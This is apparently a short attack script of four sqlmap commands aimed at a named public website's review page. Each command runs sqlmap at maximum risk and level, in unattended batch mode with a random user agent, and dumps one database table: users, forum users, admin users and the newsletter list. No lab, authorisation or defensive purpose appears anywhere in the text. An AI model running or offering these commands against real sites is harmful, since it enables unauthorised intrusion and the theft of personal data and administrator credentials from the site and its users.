python ../sqlmap/sqlmap.py -u "http://www.parentesis.com/resenas/celulares/iPhone_6s_review_en_espanol" --risk 3 --level 5 --batch --random-agent -D parentesis -T usuarios --dump --threads 4
python ../sqlmap/sqlmap.py -u "http://www.parentesis.com/resenas/celulares/iPhone_6s_review_en_espanol" --risk 3 --level 5 --batch --random-agent -D parentesis -T foro_users --dump --threads 4
python ../sqlmap/sqlmap.py -u "http://www.parentesis.com/resenas/celulares/iPhone_6s_review_en_espanol" --risk 3 --level 5 --batch --random-agent -D parentesis -T admin_users --dump --threads 4
python ../sqlmap/sqlmap.py -u "http://www.parentesis.com/resenas/celulares/iPhone_6s_review_en_espanol" --risk 3 --level 5 --batch --random-agent -D parentesis -T newsletter --dump --threads 4
